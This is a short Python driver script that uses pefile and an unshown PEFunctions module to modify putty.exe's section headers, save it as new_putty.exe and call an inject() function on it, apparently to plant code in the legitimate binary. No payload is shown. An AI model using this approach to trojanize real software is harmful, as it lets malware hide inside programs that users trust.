import pefile
from PEFunctions import *
exe_path = "putty.exe"

try:
    pe = pefile.PE(exe_path)
    printSections(pe)
    changeSectionHeader(pe)
    exe_path = "new_putty.exe"
    new_pe = pefile.PE(exe_path)
    printSections(new_pe)
    inject(new_pe)


except OSError as e:
    print(e)
except pefile.PEFormatError as e:
    print("[-] PEFormatError: %s" % e.value)
